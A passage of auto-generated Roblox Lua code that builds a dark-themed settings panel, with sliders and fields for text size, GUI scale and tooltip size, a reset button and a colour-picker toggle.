G2L["ec"] = Instance.new("UIPadding", G2L["ea"]);
G2L["ec"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.greystroke
G2L["ed"] = Instance.new("UIStroke", G2L["e3"]);
G2L["ed"]["ZIndex"] = 99;
G2L["ed"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["ed"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["ed"]["Name"] = [[greystroke]];
G2L["ed"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize
G2L["ee"] = Instance.new("Frame", G2L["e3"]);
G2L["ee"]["ZIndex"] = 99;
G2L["ee"]["BorderSizePixel"] = 0;
G2L["ee"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ee"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["ee"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["ee"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ee"]["Name"] = [[textsize]];
G2L["ee"]["LayoutOrder"] = 11;
G2L["ee"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button
G2L["ef"] = Instance.new("TextButton", G2L["ee"]);
G2L["ef"]["BorderSizePixel"] = 0;
G2L["ef"]["TextTransparency"] = 1;
G2L["ef"]["TextSize"] = 14;
G2L["ef"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ef"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ef"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ef"]["ZIndex"] = 99;
G2L["ef"]["BackgroundTransparency"] = 1;
G2L["ef"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["ef"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ef"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.UIPadding
G2L["f0"] = Instance.new("UIPadding", G2L["ef"]);
G2L["f0"]["PaddingTop"] = UDim.new(0, 2);
G2L["f0"]["PaddingRight"] = UDim.new(0, 3);
G2L["f0"]["PaddingLeft"] = UDim.new(0, 3);
G2L["f0"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame
G2L["f1"] = Instance.new("Frame", G2L["ef"]);
G2L["f1"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["f1"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["f1"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["f1"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["f1"]["Name"] = [[sliderFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.outlineStroke
G2L["f2"] = Instance.new("UIStroke", G2L["f1"]);
G2L["f2"]["Thickness"] = 2;
G2L["f2"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.buttonFade
G2L["f3"] = Instance.new("CanvasGroup", G2L["f1"]);
G2L["f3"]["BorderSizePixel"] = 0;
G2L["f3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f3"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["f3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f3"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.buttonFade.UIGradient
G2L["f4"] = Instance.new("UIGradient", G2L["f3"]);
G2L["f4"]["Rotation"] = 90;
G2L["f4"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.fillbar
G2L["f5"] = Instance.new("Frame", G2L["f1"]);
G2L["f5"]["ZIndex"] = 5;
G2L["f5"]["BorderSizePixel"] = 0;
G2L["f5"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["f5"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["f5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f5"]["Name"] = [[fillbar]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.text
G2L["f6"] = Instance.new("TextLabel", G2L["ef"]);
G2L["f6"]["ZIndex"] = 2;
G2L["f6"]["BorderSizePixel"] = 0;
G2L["f6"]["TextSize"] = 14;
G2L["f6"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f6"]["BackgroundTransparency"] = 1;
G2L["f6"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["f6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f6"]["Text"] = [[X/X]];
G2L["f6"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.text.text
G2L["f7"] = Instance.new("UIStroke", G2L["f6"]);
G2L["f7"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL
G2L["f8"] = Instance.new("Frame", G2L["e3"]);
G2L["f8"]["ZIndex"] = 99;
G2L["f8"]["BorderSizePixel"] = 0;
G2L["f8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f8"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["f8"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["f8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f8"]["Name"] = [[textsizeLABEL]];
G2L["f8"]["LayoutOrder"] = 10;
G2L["f8"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL.text
G2L["f9"] = Instance.new("TextLabel", G2L["f8"]);
G2L["f9"]["TextWrapped"] = true;
G2L["f9"]["ZIndex"] = 99;
G2L["f9"]["BorderSizePixel"] = 0;
G2L["f9"]["TextSize"] = 14;
G2L["f9"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["f9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f9"]["BackgroundTransparency"] = 1;
G2L["f9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["f9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f9"]["Text"] = [[Text Size:]];
G2L["f9"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL.text.UIPadding
G2L["fa"] = Instance.new("UIPadding", G2L["f9"]);
G2L["fa"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL.text.text
G2L["fb"] = Instance.new("UIStroke", G2L["f9"]);
G2L["fb"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize
G2L["fc"] = Instance.new("Frame", G2L["e3"]);
G2L["fc"]["ZIndex"] = 99;
G2L["fc"]["BorderSizePixel"] = 0;
G2L["fc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fc"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["fc"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["fc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fc"]["Name"] = [[guisize]];
G2L["fc"]["LayoutOrder"] = 1;
G2L["fc"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.UIPadding
G2L["fd"] = Instance.new("UIPadding", G2L["fc"]);
G2L["fd"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize
G2L["fe"] = Instance.new("Frame", G2L["fc"]);
G2L["fe"]["ZIndex"] = 99;
G2L["fe"]["BorderSizePixel"] = 0;
G2L["fe"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fe"]["Size"] = UDim2.new(0, 79, 0, 20);
G2L["fe"]["Position"] = UDim2.new(0.54598, 0, 0, 0);
G2L["fe"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fe"]["Name"] = [[guisize]];
G2L["fe"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.UIPadding
G2L["ff"] = Instance.new("UIPadding", G2L["fe"]);
G2L["ff"]["PaddingTop"] = UDim.new(0, 2);
G2L["ff"]["PaddingRight"] = UDim.new(0, 3);
G2L["ff"]["PaddingLeft"] = UDim.new(0, 3);
G2L["ff"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox
G2L["100"] = Instance.new("TextBox", G2L["fe"]);
G2L["100"]["Name"] = [[textbox]];
G2L["100"]["PlaceholderColor3"] = Color3.fromRGB(0, 124, 255);
G2L["100"]["TextSize"] = 14;
G2L["100"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
G2L["100"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["100"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["100"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["100"]["PlaceholderText"] = [[1.00]];
G2L["100"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["100"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["100"]["Text"] = [[]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.outlineStroke
G2L["101"] = Instance.new("UIStroke", G2L["100"]);
G2L["101"]["Thickness"] = 2;
G2L["101"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["101"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.buttonFade
G2L["102"] = Instance.new("CanvasGroup", G2L["100"]);
G2L["102"]["BorderSizePixel"] = 0;
G2L["102"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["102"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["102"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["102"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["102"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.buttonFade.UIGradient
G2L["103"] = Instance.new("UIGradient", G2L["102"]);
G2L["103"]["Rotation"] = 90;
G2L["103"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.text
G2L["104"] = Instance.new("UIStroke", G2L["100"]);
G2L["104"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.text
G2L["105"] = Instance.new("TextLabel", G2L["fc"]);
G2L["105"]["TextWrapped"] = true;
G2L["105"]["ZIndex"] = 99;
G2L["105"]["BorderSizePixel"] = 0;
G2L["105"]["TextSize"] = 14;
G2L["105"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["105"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["105"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["105"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["105"]["BackgroundTransparency"] = 1;
G2L["105"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["105"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["105"]["Text"] = [[GUI Scale:]];
G2L["105"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.text.UIPadding
G2L["106"] = Instance.new("UIPadding", G2L["105"]);
G2L["106"]["PaddingLeft"] = UDim.new(0, 4);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.text.text
G2L["107"] = Instance.new("UIStroke", G2L["105"]);
G2L["107"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault
G2L["108"] = Instance.new("Frame", G2L["e3"]);
G2L["108"]["ZIndex"] = 99;
G2L["108"]["BorderSizePixel"] = 0;
G2L["108"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["108"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["108"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["108"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["108"]["Name"] = [[resetdefault]];
G2L["108"]["LayoutOrder"] = 100;
G2L["108"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button
G2L["109"] = Instance.new("TextButton", G2L["108"]);
G2L["109"]["BorderSizePixel"] = 0;
G2L["109"]["TextTransparency"] = 1;
G2L["109"]["TextSize"] = 14;
G2L["109"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["109"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["109"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["109"]["ZIndex"] = 99;
G2L["109"]["BackgroundTransparency"] = 1;
G2L["109"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["109"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["109"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.UIPadding
G2L["10a"] = Instance.new("UIPadding", G2L["109"]);
G2L["10a"]["PaddingTop"] = UDim.new(0, 2);
G2L["10a"]["PaddingRight"] = UDim.new(0, 3);
G2L["10a"]["PaddingLeft"] = UDim.new(0, 3);
G2L["10a"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame
G2L["10b"] = Instance.new("Frame", G2L["109"]);
G2L["10b"]["ZIndex"] = 99;
G2L["10b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["10b"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["10b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["10b"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["10b"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame.outlineStroke
G2L["10c"] = Instance.new("UIStroke", G2L["10b"]);
G2L["10c"]["Thickness"] = 2;
G2L["10c"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame.buttonFade
G2L["10d"] = Instance.new("CanvasGroup", G2L["10b"]);
G2L["10d"]["BorderSizePixel"] = 0;
G2L["10d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["10d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10d"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame.buttonFade.UIGradient
G2L["10e"] = Instance.new("UIGradient", G2L["10d"]);
G2L["10e"]["Rotation"] = 90;
G2L["10e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.text
G2L["10f"] = Instance.new("TextLabel", G2L["109"]);
G2L["10f"]["ZIndex"] = 101;
G2L["10f"]["BorderSizePixel"] = 0;
G2L["10f"]["TextSize"] = 14;
G2L["10f"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10f"]["BackgroundTransparency"] = 1;
G2L["10f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["10f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10f"]["Text"] = [[Reset to Default]];
G2L["10f"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.text.text
G2L["110"] = Instance.new("UIStroke", G2L["10f"]);
G2L["110"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.fillbar
G2L["111"] = Instance.new("Frame", G2L["108"]);
G2L["111"]["ZIndex"] = 100;
G2L["111"]["BorderSizePixel"] = 0;
G2L["111"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["111"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["111"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["111"]["Name"] = [[fillbar]];
G2L["111"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize
G2L["112"] = Instance.new("Frame", G2L["e3"]);
G2L["112"]["ZIndex"] = 99;
G2L["112"]["BorderSizePixel"] = 0;
G2L["112"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["112"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["112"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["112"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["112"]["Name"] = [[tooltipsize]];
G2L["112"]["LayoutOrder"] = 4;
G2L["112"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button
G2L["113"] = Instance.new("TextButton", G2L["112"]);
G2L["113"]["BorderSizePixel"] = 0;
G2L["113"]["TextTransparency"] = 1;
G2L["113"]["TextSize"] = 14;
G2L["113"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["113"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["113"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["113"]["ZIndex"] = 99;
G2L["113"]["BackgroundTransparency"] = 1;
G2L["113"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["113"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["113"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.UIPadding
G2L["114"] = Instance.new("UIPadding", G2L["113"]);
G2L["114"]["PaddingTop"] = UDim.new(0, 2);
G2L["114"]["PaddingRight"] = UDim.new(0, 3);
G2L["114"]["PaddingLeft"] = UDim.new(0, 3);
G2L["114"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame
G2L["115"] = Instance.new("Frame", G2L["113"]);
G2L["115"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["115"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["115"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["115"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["115"]["Name"] = [[sliderFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.outlineStroke
G2L["116"] = Instance.new("UIStroke", G2L["115"]);
G2L["116"]["Thickness"] = 2;
G2L["116"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.buttonFade
G2L["117"] = Instance.new("CanvasGroup", G2L["115"]);
G2L["117"]["BorderSizePixel"] = 0;
G2L["117"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["117"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["117"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["117"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["117"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.buttonFade.UIGradient
G2L["118"] = Instance.new("UIGradient", G2L["117"]);
G2L["118"]["Rotation"] = 90;
G2L["118"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.fillbar
G2L["119"] = Instance.new("Frame", G2L["115"]);
G2L["119"]["ZIndex"] = 5;
G2L["119"]["BorderSizePixel"] = 0;
G2L["119"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["119"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["119"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["119"]["Name"] = [[fillbar]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.text
G2L["11a"] = Instance.new("TextLabel", G2L["113"]);
G2L["11a"]["ZIndex"] = 2;
G2L["11a"]["BorderSizePixel"] = 0;
G2L["11a"]["TextSize"] = 14;
G2L["11a"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11a"]["BackgroundTransparency"] = 1;
G2L["11a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["11a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11a"]["Text"] = [[X/X]];
G2L["11a"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.text.text
G2L["11b"] = Instance.new("UIStroke", G2L["11a"]);
G2L["11b"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL
G2L["11c"] = Instance.new("Frame", G2L["e3"]);
G2L["11c"]["ZIndex"] = 99;
G2L["11c"]["BorderSizePixel"] = 0;
G2L["11c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11c"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["11c"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["11c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11c"]["Name"] = [[tooltipsizeLABEL]];
G2L["11c"]["LayoutOrder"] = 3;
G2L["11c"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL.text
G2L["11d"] = Instance.new("TextLabel", G2L["11c"]);
G2L["11d"]["TextWrapped"] = true;
G2L["11d"]["ZIndex"] = 99;
G2L["11d"]["BorderSizePixel"] = 0;
G2L["11d"]["TextSize"] = 14;
G2L["11d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["11d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11d"]["BackgroundTransparency"] = 1;
G2L["11d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["11d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11d"]["Text"] = [[Tooltip Size:]];
G2L["11d"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL.text.UIPadding
G2L["11e"] = Instance.new("UIPadding", G2L["11d"]);
G2L["11e"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL.text.text
G2L["11f"] = Instance.new("UIStroke", G2L["11d"]);
G2L["11f"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker
G2L["120"] = Instance.new("Frame", G2L["e3"]);
G2L["120"]["BorderSizePixel"] = 0;
G2L["120"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["120"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["120"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["120"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["120"]["Name"] = [[centercolorpicker]];
G2L["120"]["LayoutOrder"] = 2;
G2L["120"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.button
G2L["121"] = Instance.new("TextButton", G2L["120"]);
G2L["121"]["BorderSizePixel"] = 0;
G2L["121"]["TextTransparency"] = 1;
G2L["121"]["TextSize"] = 14;
G2L["121"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["121"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["121"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["121"]["ZIndex"] = 50;
G2L["121"]["BackgroundTransparency"] = 1;
G2L["121"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["121"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["121"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.button.UIPadding
G2L["122"] = Instance.new("UIPadding", G2L["121"]);
G2L["122"]["PaddingTop"] = UDim.new(0, 3);
G2L["122"]["PaddingRight"] = UDim.new(0, 3);
G2L["122"]["PaddingLeft"] = UDim.new(0, 3);
G2L["122"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.centercolorpicker.button.toggleFrame
